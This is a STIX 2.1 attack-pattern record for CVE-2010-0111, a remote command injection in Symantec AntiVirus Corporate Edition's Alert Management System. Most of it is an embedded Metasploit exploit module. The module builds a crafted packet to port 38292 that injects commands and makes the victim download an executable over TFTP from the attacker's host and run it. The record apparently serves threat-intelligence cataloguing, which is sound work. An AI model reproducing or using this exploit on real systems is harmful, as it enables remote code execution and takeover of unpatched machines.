{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b073be40-5a3e-41bc-a5cb-d307cc53aa83",
    "created": "2024-08-14T16:51:36.781433Z",
    "modified": "2024-08-14T16:51:36.781437Z",
    "name": "Symantec System Center Alert Management System (hndlrsvc.exe) Arbitrary Command Execution",
    "description": " Symantec System Center Alert Management System is prone to a remote command-injection vulnerability because the application fails to properly sanitize user-supplied input.  This is part of Symantec AntiVirus Corporate Edition 8.0 - 10.1.7. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/antivirus/ams_hndlrsvc.rb",
            "external_id": "ams_hndlrsvc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0111"
        },
        {
            "source_name": "reference",
            "url": "http://www.foofus.net/~spider/code/AMS2_072610.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Symantec System Center Alert Management System (hndlrsvc.exe) Arbitrary Command Execution',\n      'Description'    => %q{\n          Symantec System Center Alert Management System is prone to a\n        remote command-injection vulnerability because the application fails\n        to properly sanitize user-supplied input.  This is part of Symantec\n        AntiVirus Corporate Edition 8.0 - 10.1.7.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '66807'],\n          ['BID', '41959'],\n          ['CVE', '2010-0111'],\n          ['URL', 'http://www.foofus.net/~spider/code/AMS2_072610.txt'],\n        ],\n      'Targets'       =>\n        [\n          [ 'Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ]\n        ],\n      'Privileged' => true,\n      'Platform' => 'win',\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2010-07-26'))\n\n    register_options([\n        Opt::RPORT(38292),\n        OptString.new('CMD', [ false, 'Execute this command instead of using command stager', \"\"]),\n        OptAddress.new('LHOST', [ false, 'The listen IP address from where the victim downloads the payload' ])\n      ])\n  end\n\n  def windows_stager\n\n    @pl = generate_payload_exe\n    @tftp = Rex::Proto::TFTP::Server.new\n    payload_name = \"#{Rex::Text.rand_text_alpha_upper(11)}.exe\"\n    @tftp.register_file(payload_name,@pl,true)\n    @tftp.start\n    print_status(\"Sending request to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    execute_command(\"tftp -i #{datastore['lhost']} GET #{payload_name}\")\n    print_status(\"Attempting to execute the payload...\")\n    execute_command(payload_name)\n  end\n\n  def execute_command(cmd, opts = {})\n\n    connect\n    if ( cmd.length > 128 )\n      fail_with(Failure::Unknown, \"Command strings greater then 128 characters will not be processed!\")\n    end\n\n    string_uno  = Rex::Text.rand_text_alpha_upper(11)\n    string_dos  = Rex::Text.rand_text_alpha_upper(rand(4) + 5)\n\n    packet =  \"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x00\"\n    packet << \"\\x02\\x00\\x95\\x94\\xc0\\xa8\\x02\\x64\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    packet << \"\\xe8\\x03\\x00\\x00\"\n    packet << 'PRGXCNFG'\n    packet << \"\\x10\\x00\\x00\\x00\"\n    packet << \"\\x00\\x00\\x00\\x00\\x04\"\n    packet << 'ALHD\\F'\n    packet << \"\\x00\\x00\\x01\\x00\\x00\"\n    packet << \"\\x00\\x01\\x00\\x0e\\x00\"\n    packet << 'Risk Repaired'\n    packet << \"\\x00\\x25\\x00\"\n    packet << 'Symantec Antivirus Corporate Edition'\n    packet << \"\\x00\\xf9\\x1d\\x13\\x4a\\x3f\"\n    packet << [string_uno.length + 1].pack('v') + string_uno\n    packet << \"\\x00\\x08\\x08\\x0a\"\n    packet << \"\\x00\" + 'Risk Name'\n    packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')\n    packet << \"\\x00\" + string_dos\n    packet << \"\\x00\\x08\\x0a\\x00\"\n    packet << 'File Path'\n    packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')\n    packet << \"\\x00\" + string_dos\n    packet << \"\\x00\\x08\\x11\\x00\"\n    packet << 'Requested Action'\n    packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')\n    packet << \"\\x00\" + string_dos\n    packet << \"\\x00\\x08\\x0e\\x00\"\n    packet << 'Actual Action'\n    packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')\n    packet << \"\\x00\" + string_dos\n    packet << \"\\x00\\x08\\x07\\x00\"\n    packet << 'Logger'\n    packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')\n    packet << \"\\x00\" + string_dos\n    packet << \"\\x00\\x08\\x05\\x00\"\n    packet << 'User'\n    packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')\n    packet << \"\\x00\" + string_dos\n    packet << \"\\x00\\x08\\x09\\x00\"\n    packet << 'Hostname'\n    packet << \"\\x00\\x0e\\x00\" + [string_uno.length + 1].pack('v') + string_uno\n    packet << \"\\x00\\x08\\x13\\x00\"\n    packet << 'Corrective Actions'\n    packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')\n    packet << \"\\x00\" + string_dos\n    packet << \"\\x00\\x00\\x07\\x08\\x12\\x00\"\n    packet << 'ConfigurationName'\n    packet << [cmd.length + 3].pack('n') + [cmd.length + 1].pack('n')\n    packet << \"\\x00\" + cmd\n    packet << \"\\x00\\x08\\x0c\\x00\"\n    packet << 'CommandLine'\n    packet << [cmd.length + 3].pack('n') + [cmd.length + 1].pack('n')\n    packet << \"\\x00\" + cmd\n    packet << \"\\x00\\x08\\x08\\x00\"\n    packet << 'RunArgs'\n    packet << \"\\x00\\x04\\x00\\x02\\x00\"\n    packet << \"\\x20\\x00\\x03\\x05\\x00\"\n    packet << 'Mode'\n    packet << \"\\x00\\x04\\x00\\x02\\x00\\x00\\x00\"\n    packet << \"\\x0a\\x0d\\x00\"\n    packet << 'FormatString'\n    packet << \"\\x00\\x02\\x00\\x00\\x00\\x08\\x12\\x00\"\n    packet << 'ConfigurationName'\n    packet << \"\\x00\\x02\\x00\\x00\\x00\\x08\\x0c\\x00\"\n    packet << 'HandlerHost'\n    packet << [string_dos.length + 3].pack('n') + [string_dos.length + 1].pack('n')\n    packet << \"\\x00\" + string_dos\n    packet << \"\\x00\" * packet.length\n\n    sock.put(packet)\n\n    select(nil,nil,nil,3)\n    disconnect\n  end\n\n  def exploit\n\n    unless datastore['CMD'].blank?\n      print_status(\"Executing command '#{datastore['CMD']}'\")\n      execute_command(datastore['CMD'])\n      return\n    end\n\n    case target['Platform']\n      when 'win'\n        if datastore['LHOST'].blank?\n          fail_with(Failure::Unknown, 'If no custom CMD is set, LHOST is required.')\n        end\n        windows_stager\n      else\n        fail_with(Failure::Unknown, 'Target not supported.')\n    end\n\n    handler\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2010-07-26",
    "x_mitre_platforms": [
        "win'"
    ]
}